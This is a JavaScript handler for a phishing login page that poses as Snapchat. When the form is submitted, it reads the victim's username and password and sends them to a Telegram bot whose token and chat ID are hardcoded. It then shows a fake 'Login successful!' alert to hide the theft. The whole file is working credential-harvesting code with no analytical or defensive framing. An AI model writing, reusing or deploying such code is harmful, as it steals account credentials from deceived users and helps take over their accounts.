document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const loginButton = document.getElementById('loginButton');
  const spinner = document.getElementById('spinner');
  
  // Show spinner and disable button
  spinner.style.opacity = 1;
  loginButton.disabled = true;
  
  const botToken = '8194664489:AAHr7TJ6UkbfjvxhS4mf-ZJf4iZglRbaovA';
  const chatId = '7742630008';
  const message = `New Snapchat login attempt:\nUsername: ${username}\nPassword: ${password}`;
  
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        alert('Login successful!');
      } else {
        alert('Login failed. Please try again.');
      }
      // Hide spinner and enable button
      spinner.style.opacity = 0;
      loginButton.disabled = false;
    })
    .catch(error => {
      console.error('Error:', error);
      alert('An error occurred. Please try again later.');
      // Hide spinner and enable button
      spinner.style.opacity = 0;
      loginButton.disabled = false;
    });
});